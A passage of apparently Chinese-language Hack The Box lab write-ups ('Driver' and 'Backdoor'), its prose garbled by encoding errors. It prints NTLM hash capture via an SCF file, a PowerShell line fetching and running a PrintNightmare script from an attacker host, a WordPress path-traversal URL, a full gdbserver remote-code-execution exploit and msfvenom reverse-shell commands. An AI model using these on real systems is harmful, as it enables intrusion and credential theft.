[https://www.hackingarticles.in/smb-penetration-testing-port-445/](https://www.hackingarticles.in/smb-penetration-testing-port-445/)\n\n> [https://sql--injection.blogspot.com/p/smb.html](https://sql--injection.blogspot.com/p/smb.html)\n\n## æ¼æ´åˆ©ç”¨\né¦–å…ˆåˆ›å»ºä¸€ä¸ªshell.scfæ–‡ä»¶\n\n```bash\n[Shell]\nCommand=2\nIconFile=\\\\10.10.14.18\\share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n```\nç„¶åä½¿ç”¨responderç›‘å¬å’±ä»¬è¿æ¥htbçš„é‚£ä¸ªç½‘å¡\n\n```bash\nresponder -wrf --lm -v -I tun0\n```\nç„¶åå»ä¹‹å‰æ‰¾åˆ°çš„ä¸Šä¼ ç‚¹ä¸Šä¼ æˆ‘ä»¬çš„shell.scfæ–‡ä»¶\n\n```bash\n[SMB] NTLMv2 Client   : 10.10.11.106\n[SMB] NTLMv2 Username : DRIVER\\tony\n[SMB] NTLMv2 Hash     : tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000\n```\nç„¶åresponderç›‘å¬çš„ç½‘å¡ä¼šæ•è·åˆ°è´¦æˆ·å’Œhash\n\næˆ‘ä»¬æ‹¿å»åˆ°hashcaté‡Œè¿›è¡Œè§£æ\n\n```bash\næŒ‡ä»¤ï¼šhashcat -m 5600 tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000 /usr/share/wordlists/rockyou.txt --force\n\nç»“æœï¼šTONY::DRIVER:4621242103dad095:83bfcb019542f3819bc7e01483163418:0101000000000000758c41c3a6e2d701fdd24c3ff72cbc5100000000020000000000000000000000:liltony\n\nè´¦å·ï¼štony\nå¯†ç ï¼šliltony\n```\nä½¿ç”¨evil-winrmè¿›è¡Œç™»å½•\n\n```bash\nå®‰è£…evil-winrmï¼šgem install evil-winrm\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# evil-winrm -i 10.10.11.106 -u tony -p liltony\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\tony\\Documents>\n```\n```bash\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> whoami\ndriver\\tony\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> ls\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> cd ..\n*Evil-WinRM* PS C:\\Users\\tony> cd Desktop\n*Evil-WinRM* PS C:\\Users\\tony\\Desktop> ls\n\n    Directory: C:\\Users\\tony\\Desktop\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---       11/25/2021   6:07 PM             34 user.txt\n\n*Evil-WinRM* PS C:\\Users\\tony\\Desktop> cat user.txt\n459008f0f8600767fe59f9602714aa04\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag\n\n## æƒé™æå‡\n```bash\nget-process\n```\nä½¿ç”¨è¯¥å‘½ä»¤è·å–é¶æœºçš„è¿›ç¨‹ï¼Œåœ¨è¿›ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ä¸€æ¡\n\n```bash\n379      22     5140      13908 ...12            1228 spoolsv\n```\nåœ¨è¿›ç¨‹ä¸­å‘ç°spoolsvåœ¨è¿è¡Œï¼Œçªç ´å£å°±åœ¨è¿™äº†\n\nä½¿ç”¨æ¼æ´CVE-2021-1675å³å¯ææƒ\n\n> [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)\n\nåœ¨æœ¬åœ°ä½¿ç”¨python3æ¶è®¾ä¸€ä¸ªhttpæœåŠ¡å™¨\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# python3 -m http.server 80                 \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\nç„¶åè¿œç¨‹åŠ è½½æˆ‘ä»¬çš„è„šæœ¬\n\n```bash\nIEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.18/CVE-2021-1675.ps1\")\n```\nä½¿ç”¨è„šæœ¬æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·\n\n```bash\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> Invoke-Nightmare -DriverName \"DRIVER\" -NewUser \"lucifiel\" -NewPassword \"lucifiel123\"\n[+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll\n[+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll\"\n[+] added user lucifiel as local administrator\n[+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll\n```\n```bash\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> net user\n\nUser accounts for \\\\\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest\nlucifiel                 tony\nThe command completed with one or more errors.\n\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> runas /user:lucifiel powershell.exe\nEnter the password for lucifiel:\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> net localgroup administrators\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nlucifiel\nThe command completed successfully.\n```\nç¡®è®¤æƒé™ç»„æ²¡é—®é¢˜\n\nä½¿ç”¨æ–°åˆ›å»ºçš„è´¦æˆ·è¿›è¡Œç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# evil-winrm -i 10.10.11.106 -u lucifiel -p lucifiel123\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\lucifiel\\Documents> whoami\ndriver\\lucifiel\n```\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> ls\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---       11/26/2021   4:54 AM             34 root.txt\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> cat root.txt\n548e6653f57567449ffce29432eaa8c3\n```\næˆåŠŸå¾—åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Backdoor - Hackthebox","url":"/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/","content":"\n# Hackthebox - Backdoor\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Backdoor/aa013859-cc94-4d60-aee8-126626eb8298.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Backdoor/c5f4885a-3c5a-43a4-a83a-cff2f782854e.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.125\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 20:41 EST\nNmap scan report for 10.10.11.125\nHost is up (0.39s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)\n|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)\n|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-generator: WordPress 5.8.1\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Backdoor â€“ Real-Life\n1337/tcp open  waste?\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=11/21%OT=22%CT=1%CU=33566%PV=Y%DS=2%DC=T%G=Y%TM=619AF5\nOS:A4%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=FB%GCD=1%ISR=101%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3\nOS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F\nOS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW\nOS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF\nOS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=\nOS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=\nOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT       ADDRESS\n1   492.34 ms loaclhost (10.10.14.1)\n2   492.34 ms 10.10.11.125\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 75.37 seconds\n```\nä»ä¸Šå¯ä»¥çœ‹åˆ°è¯¥å°é¶æœºä½¿ç”¨äº†WordPress 5.8.1 CMSä½œä¸ºæœåŠ¡æ­å»ºï¼Œå’±ä»¬å»wpscanä¸€ä¸‹ï¼Œé¡ºä¾¿æœç´¢çœ‹çœ‹æ˜¯å¦æœ‰æ¼æ´\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# wpscan --url 10.10.11.125 --enumerate vp,u,vt,tt\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ Â®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.17\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.11.125/ [10.10.11.125]\n[+] Started: Sun Nov 21 20:55:16 2021\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.11.125/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).\n | Found By: Rss Generator (Passive Detection)\n |  - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>\n |  - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/\n | Latest Version: 2.8 (up to date)\n | Last Updated: 2021-07-22T00:00:00.000Z\n | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt\n | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.8 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'\n\n[+] Enumerating Vulnerable Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:00:30 <====================================================================================================================================> (358 / 358) 100.00% Time: 00:00:30\n[+] Checking Theme Versions (via Passive and Aggressive Methods)\n\n[i] No themes Found.\n\n[+] Enumerating Timthumbs (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:04:14 <==================================================================================================================================> (2575 / 2575) 100.00% Time: 00:04:14\n\n[i] No Timthumbs Found.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:03 <======================================================================================================================================> (10 / 10) 100.00% Time: 00:00:03\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By:\n |  Wp Json Api (Aggressive Detection)\n |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Sun Nov 21 21:00:23 2021\n[+] Requests Done: 2976\n[+] Cached Requests: 18\n[+] Data Sent: 836.808 KB\n[+] Data Received: 721.12 KB\n[+] Memory used: 297.57 MB\n[+] Elapsed time: 00:05:07\n```\nè¿™è¾¹æ‰«æåå¹¶æ²¡æœ‰ä»€ä¹ˆå¤ªå¤šæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ’ä»¶å’Œä¸»é¢˜éƒ½æ²¡æ‰«æå‡ºæ¥ï¼Œä½†çŸ¥é“äº†ç®¡ç†å‘˜ç”¨æˆ·ä¸ºadmin\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit WordPress 5.8.1\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nWordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                                               | php/webapps/39553.txt\nWordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                                         | php/webapps/44943.txt\nWordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                                                       | php/webapps/48918.sh\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\næœç´¢åä¹Ÿå‘ç°ç¡®å®å­˜åœ¨ä¸‰ä¸ªæ¼æ´ï¼Œä½†éƒ½æ˜¯æ’ä»¶æ¼æ´ï¼Œæš‚æ—¶æ— æ³•ç¡®å®šæ˜¯å¦å­˜åœ¨è¿™äº›æ’ä»¶ï¼Œå’±ä»¬å…ˆå»\n\nçœ‹çœ‹ç½‘ç«™å†…å®¹\n\n![](Hackthebox-Backdoor/940ed798-c2c5-4695-a98c-d570132f10ba.png)\n\nç‚¹å‡»Homeä»¥åè·³è½¬åˆ°[http://backdoor.htb/](http://backdoor.htb/)ç„¶åæç¤ºå’±ä»¬æ— æ³•è®¿é—®ï¼ŒæŠŠbackdoor.htbåŠ å…¥hostsé‡Œå†è®¿é—®\n\nåŠ å…¥åç®€å•çœ‹äº†ä¸€ä¸‹ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œå’±ä»¬æ‰«æä¸€ä¸‹è·¯å¾„çœ‹çœ‹å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 50 -u http://backdoor.htb/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://backdoor.htb/\n[+] Method:                  GET\n[+] Threads:                 50\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/11/21 21:15:59 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://backdoor.htb/wp-content           (Status: 301) [Size: 317] [--> http://backdoor.htb/wp-content/]\nhttp://backdoor.htb/wp-includes          (Status: 301) [Size: 318] [--> http://backdoor.htb/wp-includes/]\nhttp://backdoor.htb/wp-admin             (Status: 301) [Size: 315] [--> http://backdoor.htb/wp-admin/]   \nhttp://backdoor.htb/server-status        (Status: 403) [Size: 277]                                       \n\n===============================================================\n2021/11/21 21:47:17 Finished\n===============================================================\n```\n## æ¼æ´åˆ©ç”¨\nè¿˜æ˜¯æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæœ‰ç‚¹éš¾æå•Šï¼Œåªèƒ½æ‰‹åŠ¨å»è®¿é—®äº†ï¼Œé¦–å…ˆå…ˆå»contentçœ‹çœ‹å§\n\nè®¿é—®contentåæ˜¯ç©ºç™½é¡µé¢ï¼Œç„¶åæ¥ç€æ ¹æ®ç»éªŒè¿›è¡Œæ‰‹åŠ¨è®¿é—®ï¼ˆç”±äºæˆ‘ä½¿ç”¨çš„æ˜¯æµé‡åœ¨è¿›è¡Œæ¸—é€ï¼Œç»§ç»­çˆ†ç ´å·¥ä½œé‡æ¯”è¾ƒå¤§ï¼Œåªèƒ½æ ¹æ®ç»éªŒè¿›è¡Œåˆ¤æ–­äº†ï¼‰\n\n[http://backdoor.htb/wp-content/plugins/](http://backdoor.htb/wp-content/plugins/)åœ¨è¯¥è·¯å¾„ä¸‹æœ‰å†…å®¹äº†ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªç›®å½•éå†æ¼æ´\n\n![](Hackthebox-Backdoor/391b9bc7-351a-4095-afa0-954dcc56a79a.png)\n\nebook-downloadåº”å½“æ˜¯ä¸€ä¸ªwordpressçš„æ’ä»¶ï¼Œè¿›å»çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Backdoor/c56ac66f-b332-4b53-acc5-06f0d537d766.png)\n\næœ‰å†…å®¹çš„åªæœ‰readme.txt è¿›å»çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Backdoor/420d2261-aeed-49ed-a74b-967f412dd4d9.png)\n\nç¡®è®¤æ˜¯ä¸€ä¸ªæ’ä»¶ï¼Œå’±ä»¬å»exploit-dbæœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰æ¼æ´\n\n> [https://www.exploit-db.com/exploits/39575](https://www.exploit-db.com/exploits/39575)\n\nè¿˜çœŸè®©æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªæ¼æ´\n\n```bash\nhttp://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php\n```\nè¿™æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½çš„æ¼æ´ï¼Œä¸‹è½½ä¸€ä¸ªé…ç½®æ–‡ä»¶çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Backdoor/633a48e3-4c7f-459c-99d0-ab11340079d4.png)\n\nç¡®è®¤æ¼æ´å­˜åœ¨ä¸”å¯è¢«åˆ©ç”¨ï¼Œæ‹¿ç€å¯¹æ•°æ®åº“å¯†ç å»å°è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥ç™»å½•adminç”¨æˆ·\n\n![](Hackthebox-Backdoor/f888d85c-2e76-415e-ad02-1642a28f4f6f.png)\n\nå¥½å§çœ‹æ¥æ˜¯æˆ‘å¹´è½»äº†ï¼Œæ˜¯æ— æ³•ç›´æ¥åˆ©ç”¨çš„ï¼Œå’±ä»¬è¿˜å¾—æƒ³åŠæ³•è¿›å…¥æ•°æ®åº“\n\nçªç„¶æ¥äº†çµæ„Ÿï¼Œæˆ–è®¸çªç ´å£åœ¨æ— æ³•è¯»å–åˆ°ä»»ä½•ä¿¡æ¯çš„1337ç«¯å£ä¸Šå‘¢ï¼Ÿä½†æ˜¯æˆ‘ä»¬æ— æ³•è¯»å–1337ç«¯å£ï¼Œæ€ä¹ˆçŸ¥é“å®ƒæ˜¯ä»€ä¹ˆæœåŠ¡å‘¢ï¼Ÿ\n\næœ‰åŠæ³•\n\nä½¿ç”¨Wordpressæ’ä»¶çš„LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰æ¥è¿›è¡Œç«¯å£è¯»å–ï¼Œå’±è¯´å¹²å°±å¹²\n\n![](Hackthebox-Backdoor/e5ab6400-5b2e-444c-afbf-8d15ee90485b.png)\n\nåƒè¿™æ ·è¯»å–/proc/pid/cmdlineæ–‡ä»¶å°±å¯ä»¥äº†ï¼Œå…¶ä¸­pidæ˜¯å¯å˜æ•°å­—ï¼Œæ ¹æ®æµ‹è¯•æ•°å­—èŒƒå›´åº”è¯¥åœ¨900-1000ä¹‹é—´\n\n![](Hackthebox-Backdoor/d2303cc9-057d-4aa1-86d6-64a024bbe8de.png)\n\næ‰€ä»¥æˆ‘ä»¬åƒè¿™æ ·è®¾ç½®å¥½å°±å¯ä»¥å¼€å§‹çˆ†ç ´äº†\n\n![](Hackthebox-Backdoor/1e6f2fe8-f4a5-4ef3-af20-2657c026f795.png)\n\næœ‰äº†ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªgdbserverçš„æœåŠ¡ï¼Œç»è¿‡æµ‹è¯•è¯¥æœåŠ¡æ˜¯æ¶è®¾åœ¨1337ç«¯å£ä¸Šçš„ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨\n\nåŒæ—¶è¿˜å‘ç°ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿\n\n![](Hackthebox-Backdoor/2d8b4879-3ed3-498a-b3d8-e641e905ac54.png)\n\nç§ç§ï¼Œè¿™è¿˜æ²¡getshellå‘¢ï¼Œå·²ç»æŠŠrootçš„ä¸œè¥¿éƒ½æåˆ°äº†ï¼Œä¹Ÿæ˜¯æ²¡è°äº†\n\n> [https://www.exploit-db.com/exploits/50539](https://www.exploit-db.com/exploits/50539)\n\nè¿™é‡Œæ‰¾åˆ°äº†ä¸€ç¯‡gdbserver rceçš„exploitï¼Œå¼€å¹²\n\né¦–å…ˆå°†exploitä¿å­˜åˆ°æœ¬åœ°\n\n### Step 1\n```bash\n# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)\n# Date: 2021-11-21\n# Exploit Author: Roberto Gesteira MiÃ±arro (7Rocky)\n# Vendor Homepage: https://www.gnu.org/software/gdb/\n# Software Link: https://www.gnu.org/software/gdb/download/\n# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2\n# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)\n\n#!/usr/bin/env python3\n\nimport binascii\nimport socket\nimport struct\nimport sys\n\nhelp = f'''\nUsage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>\n\nExample:\n- Victim's gdbserver   ->  10.10.10.200:1337\n- Attacker's listener  ->  10.10.10.100:4444\n\n1. Generate shellcode with msfvenom:\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin\n\n2. Listen with Netcat:\n$ nc -nlvp 4444\n\n3. Run the exploit:\n$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin\n'''\n\ndef checksum(s: str) -> str:\n    res = sum(map(ord, s)) % 256\n    return f'{res:2x}'\n\ndef ack(sock):\n    sock.send(b'+')\n\ndef send(sock, s: str) -> str:\n    sock.send(f'${s}#{checksum(s)}'.encode())\n    res = sock.recv(1024)\n    ack(sock)\n    return res.decode()\n\ndef exploit(sock, payload: str):\n    send(sock, 'qSupported:multiprocess+;qRelocInsn+;qvCont+;')\n    send(sock, '!')\n\n    try:\n        res = send(sock, 'vCont;s')\n        data = res.split(';')[2]\n        arch, pc = data.split(':')\n    except Exception:\n        print('[!] ERROR: Unexpected response. Try again later')\n        exit(1)\n\n    if arch == '10':\n        print('[+] Found x64 arch')\n        pc = binascii.unhexlify(pc[:pc.index('0*')])\n        pc += b'\\0' * (8 - len(pc))\n        addr = hex(struct.unpack('<Q', pc)[0])[2:]\n        addr = '0' * (16 - len(addr)) + addr\n    elif arch == '08':\n        print('[+] Found x86 arch')\n        pc = binascii.unhexlify(pc)\n        pc += b'\\0' * (4 - len(pc))\n        addr = hex(struct.unpack('<I', pc)[0])[2:]\n        addr = '0' * (8 - len(addr)) + addr\n\n    hex_length = hex(len(payload))[2:]\n\n    print('[+] Sending payload')\n    send(sock, f'M{addr},{hex_length}:{payload}')\n    send(sock, 'vCont;c')\n\ndef main():\n    if len(sys.argv) < 3:\n        print(help)\n        exit(1)\n\n    ip, port = sys.argv[1].split(':')\n    file = sys.argv[2]\n\n    try:\n        with open(file, 'rb') as f:\n            payload = f.read().hex()\n    except FileNotFoundError:\n        print(f'[!] ERROR: File {file} not found')\n        exit(1)\n\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((ip, int(port)))\n        print('[+] Connected to target. Preparing exploit')\n        exploit(sock, payload)\n        print('[*] Pwned!! Check your listener')\n\nif __name__ == '__main__':\n    main()\n```\n### Step 2\nç„¶åä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªæœ¨é©¬\n\n```bash\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 PrependFork=true -o rev.bin\n```\n### Step 3\nä½¿ç”¨ncç›‘å¬ä¸€ä¸ªæœ¬åœ°ç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n### Step 4\næ‰§è¡ŒExploit\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# python3 exploit.py 10.10.11.125:1337 rev.bin                                          1 â¨¯\n[+] Connected to target. Preparing exploit\n[+] Found x64 arch\n[+] Sending payload\n[*] Pwned!! Check your listener\n```\nç„¶åæˆåŠŸå¼¹å›ä¸€ä¸ªshell\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444   \nlistening on [any] 4444 ...\nconnect to [10.10.14.23] from (UNKNOWN) [10.10.11.125] 50626\nwhoami&&id\nuser\nuid=1000(user) gid=1000(user) groups=1000(user)\n```\nä½¿ç”¨python3è·å–ä¸€ä¸ªäº¤äº’å¼shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\nuser@Backdoor:/home/user$\n\nuser@Backdoor:/home/user$ ls\nls\nuser.txt\nuser@Backdoor:/home/user$ cat user.txt  \ncat user.txt\n10ba3c92228d369cea03eec58f58420c\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag\n\n## æƒé™æå‡\nè¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„screenå—ï¼Ÿè¿™å°±æ˜¯ææƒçš„å…³é”®ï¼Œææƒåªéœ€è¦ä¸¤å¥\n\n```bash\nexport TERM=xterm\nscreen -x root/root\n```\nç„¶åå³å¯è¿›å…¥rootæƒé™\n\n```bash\nroot@Backdoor:~# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ°rootæƒé™\n\n```bash\nroot@Backdoor:~# ls\nls\nroot.txt\nroot@Backdoor:~# cat root.txt\ncat root.txt\n692be0661cb8d3c7cdf05379c93b9e8c\n```\næˆåŠŸæ‹¿åˆ°rootç”¨æˆ·çš„flagæƒé™","tags":["Hackthebox"]},{"title":"Kioptrix Level 1 - 